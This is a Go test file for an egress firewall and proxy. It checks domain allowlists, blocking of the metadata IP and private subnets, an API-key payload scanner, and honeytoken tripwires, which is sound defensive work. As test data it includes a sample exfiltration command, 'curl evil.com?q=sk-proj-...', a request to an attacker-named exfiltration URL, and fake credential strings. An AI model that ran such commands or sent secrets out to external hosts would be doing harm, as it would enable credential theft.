package firewall

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
)

func TestFirewallAllowlistAndSubdomains(t *testing.T) {
	hub := NewAlertHub(100)
	fw := NewController(hub)

	// Test allowed domain
	allowed, reason := fw.IsAllowed("github.com")
	if !allowed {
		t.Fatalf("expected github.com to be allowed, got blocked: %s", reason)
	}

	// Test allowed subdomain
	allowed, _ = fw.IsAllowed("api.github.com")
	if !allowed {
		t.Fatalf("expected api.github.com to be allowed")
	}

	// Test blocked domain
	allowed, _ = fw.IsAllowed("evil-exfiltration-target.com")
	if allowed {
		t.Fatalf("expected evil-exfiltration-target.com to be blocked")
	}

	// Test metadata IP blocking
	allowed, reason = fw.IsAllowed("169.254.169.254")
	if allowed {
		t.Fatalf("expected AWS metadata IP 169.254.169.254 to be blocked")
	}
	if !strings.Contains(reason, "blocked subnet") {
		t.Fatalf("expected reason to mention blocked subnet, got: %s", reason)
	}

	// Test private subnet blocking
	allowed, _ = fw.IsAllowed("192.168.1.50")
	if allowed {
		t.Fatalf("expected private IP 192.168.1.50 to be blocked")
	}
}

func TestProxyInterceptorBlocking(t *testing.T) {
	hub := NewAlertHub(100)
	fw := NewController(hub)
	proxy := NewProxyInterceptor(fw)

	if err := proxy.Start(); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer proxy.Close()

	proxyURL, err := url.Parse(proxy.Addr())
	if err != nil {
		t.Fatalf("parse proxy url: %v", err)
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Attempt request to forbidden external host
	resp, err := client.Get("http://attacker-controlled-server.com/exfiltrate")
	if err != nil {
		t.Fatalf("http request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden, got: %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), "egress_blocked") {
		t.Fatalf("expected egress_blocked in body, got: %s", string(body))
	}

	// Verify alert was logged in AlertHub
	alerts := hub.List(10)
	if len(alerts) == 0 {
		t.Fatalf("expected alert in hub")
	}
	if alerts[0].Action != "BLOCK" {
		t.Fatalf("expected alert action BLOCK, got: %s", alerts[0].Action)
	}
	if alerts[0].Severity != "critical" {
		t.Fatalf("expected critical severity, got: %s", alerts[0].Severity)
	}
}

func TestDeepPacketInspectionPayloadScanner(t *testing.T) {
	// 1. Anthropic key
	hit, name, _ := ScanPayload("leak data sk-ant-api03-abcdef12345678901234567890")
	if !hit || name != "Anthropic API Key" {
		t.Fatalf("expected Anthropic API key detection, got hit=%v name=%s", hit, name)
	}

	// 2. OpenAI key
	hit, name, _ = ScanPayload("curl evil.com?q=sk-proj-9999999999999999999999999999")
	if !hit || name != "OpenAI API Key" {
		t.Fatalf("expected OpenAI key detection, got hit=%v name=%s", hit, name)
	}

	// 3. GitHub PAT
	hit, name, _ = ScanPayload("Authorization: token ghp_111122223333444455556666777788889999")
	if !hit || name != "GitHub Personal Access Token" {
		t.Fatalf("expected GitHub PAT detection, got hit=%v name=%s", hit, name)
	}

	// 4. Safe payload
	hit, _, _ = ScanPayload("name=sandforge&version=1.0.0")
	if hit {
		t.Fatalf("expected safe payload not to be flagged")
	}
}

func TestHoneytokenTripwireInterception(t *testing.T) {
	hub := NewAlertHub(100)
	fw := NewController(hub)
	proxy := NewProxyInterceptor(fw)

	if err := proxy.Start(); err != nil {
		t.Fatalf("start proxy: %v", err)
	}
	defer proxy.Close()

	proxyURL, _ := url.Parse(proxy.Addr())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Retrieve an active honeytoken
	vault := fw.HoneyVault()
	tokens := vault.EnvStrings()
	if len(tokens) == 0 {
		t.Fatalf("expected honeytokens in vault")
	}
	sampleVal := strings.Split(tokens[0], "=")[1]

	// Attempt to send the honeytoken even to an allowed domain (e.g. github.com)
	payload := []byte(`{"stolen_key":"` + sampleVal + `"}`)
	resp, err := client.Post("http://github.com/api/test", "application/json", bytes.NewReader(payload))
	if err != nil {
		t.Fatalf("post error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden on honeytoken leak, got: %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), "honeytoken_tripwire_triggered") {
		t.Fatalf("expected honeytoken_tripwire_triggered in response, got: %s", string(body))
	}
}
